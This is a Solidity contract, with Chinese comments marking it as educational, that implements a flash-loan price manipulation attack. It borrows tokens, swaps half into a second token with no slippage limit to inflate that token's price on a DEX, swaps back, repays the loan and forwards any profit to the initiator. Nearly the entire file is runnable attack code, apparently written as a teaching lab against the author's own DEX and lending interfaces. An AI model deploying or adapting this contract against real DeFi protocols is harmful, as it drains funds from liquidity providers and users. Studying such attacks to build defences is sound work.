// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// 你的 FlashLoan 接口
interface IFlashLoan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    function flashFee(address token, uint256 amount) external view returns (uint256);
}

// 你的 DeFiDex 接口（swap + getPrices）
interface IDefiDex {
    function swap(uint256 amountIn, uint256 minAmountOut, address tokenIn, address tokenOut, uint256 deadline) external returns (uint256);

    function getPrices() external view returns (uint256 price0, uint256 price1);
}

/// @title FlashLoanAttack
/// @notice ⚠️ 教育目的：演示闪电贷预言机操纵攻击
/// @dev 仅用于学习，不要部署到主网
///
/// 攻击流程:
///   1. 闪电贷借大量 Token A
///   2. 用 Token A 在 DEX 大量买入 Token B → Token B 价格暴涨
///   3. 用被操纵的价格做坏事（这里只是演示价格变化）
///   4. 卖回 Token B 换 Token A
///   5. 还闪电贷 + 手续费
///   6. 赚取差价
contract FlashLoanAttack {
    using SafeERC20 for IERC20;

    // ============ 错误定义 ============
    error AttackFailed();

    // ============ 事件 ============
    event AttackExecuted(uint256 priceBefore, uint256 priceAfter, uint256 profit);

    event AttackStep(string step, uint256 value);

    // ============ 攻击入口 ============

    /// @notice 发起攻击 ⚔️
    /// @param flashLoanAddr 闪电贷合约地址
    /// @param dexAddr DEX 合约地址
    /// @param tokenToBorrow 要借的代币（通常是最有流动性的那个）
    /// @param tokenToManipulate 要操纵价格的代币
    /// @param borrowAmount 借款数量
    function executeAttack(
        address flashLoanAddr,
        address dexAddr,
        address tokenToBorrow,
        address tokenToManipulate,
        uint256 borrowAmount
    ) external {
        // Step 0: 记录攻击前价格
        (uint256 priceBefore, ) = IDefiDex(dexAddr).getPrices();
        emit AttackStep("Price before attack", priceBefore);

        // Step 1: 发起闪电贷
        // 传递编码后的参数给 onFlashLoan
        bytes memory data = abi.encode(dexAddr, tokenToBorrow, tokenToManipulate, priceBefore);

        IFlashLoan(flashLoanAddr).flashLoan(
            address(this),      // receiver = 自己
            tokenToBorrow,
            borrowAmount,
            data
        );

        // 到这里说明攻击成功（否则在上面就 revert 了）
    }

    // ============ ERC-3156 回调 ============

    /// @notice 闪电贷回调 — 攻击逻辑在这里执行！
    function onFlashLoan(
        address initiator,
        address /* token */,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // 1. 解码参数
        (address dexAddr, address tokenToBorrow, address tokenToManipulate, uint256 priceBefore) = abi.decode(data, (address, address, address, uint256));
    
        emit AttackStep("Flash loan received", amount);

        // 2. ⚔️ Step 1: 授权 DEX 使用借来的代币
        IERC20(tokenToBorrow).approve(dexAddr, amount);

        // 3. ⚔️ Step 2: 用借来的代币大量买入 tokenToManipulate
        //    这会导致 tokenToManipulate 的价格暴涨！
        uint256 deadline = block.timestamp + 300;  // 5 分钟

        // 留一半做攻击，另一半留着还钱
        uint256 swapAmount = amount / 2;

        IDefiDex(dexAddr).swap(
            swapAmount,         // 用一半的借入代币
            0,                  // minAmountOut = 0（攻击者不 care 滑点）
            tokenToBorrow,      // tokenIn
            tokenToManipulate,  // tokenOut
            deadline
        );

        // 4. 📊 Step 3: 检查价格被操纵的效果
        (uint256 priceAfter, ) = IDefiDex(dexAddr).getPrices();
        emit AttackStep("Price after manipulation", priceAfter);

        // 5. 📊 Step 4: 计算攻击效果
        uint256 priceChange;
        if (priceAfter > priceBefore) {
            priceChange = priceAfter - priceBefore;
        }
        emit AttackStep("Price change", priceChange);

        // 6. 💰 Step 5: 卖回 tokenToManipulate 换回 tokenToBorrow（准备还钱）
        //    获取当前持有的 tokenToManipulate 数量
        uint256 manipulatedTokenBalance = IERC20(tokenToManipulate).balanceOf(address(this));
        if (manipulatedTokenBalance > 0) {
            IERC20(tokenToManipulate).approve(dexAddr, manipulatedTokenBalance);
            IDefiDex(dexAddr).swap(
                manipulatedTokenBalance,
                0,
                tokenToManipulate,
                tokenToBorrow,
                deadline
            );
        }

        // 7. 📊 Step 6: 检查剩余利润
        uint256 balanceAfter = IERC20(tokenToBorrow).balanceOf(address(this));
        uint256 totalToRepay = amount + fee;

        emit AttackStep("Balance after swap back", balanceAfter);
        emit AttackStep("Amount to repay", totalToRepay);

        // 8. 💸 Step 7: 还钱！⭐ 必须用 safeTransfer 把 token 还给 FlashLoan 合约
        //    注意：不能只用 approve，FlashLoan 检查的是自己的余额，不会 pull token
        //    如果余额不够（攻击不盈利），转回所有余额，FlashLoan 会给出清晰的 FlashLoanNotRepaid 错误
        uint256 repayAmount = balanceAfter >= totalToRepay ? totalToRepay : balanceAfter;
        if (repayAmount > 0) {
            IERC20(tokenToBorrow).safeTransfer(msg.sender, repayAmount);
        }

        // 9. 如果有利润，转给攻击发起者
        if (balanceAfter > totalToRepay) {
            uint256 profit = balanceAfter - totalToRepay;
            // ⚠️ 教育用途：使用 initiator（回调参数）而非 tx.origin
            IERC20(tokenToBorrow).safeTransfer(initiator, profit);
            emit AttackExecuted(priceBefore, priceAfter, profit);
        }

        // 10. 返回魔法值 — 证明我们是合法的 ERC-3156 借款人
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}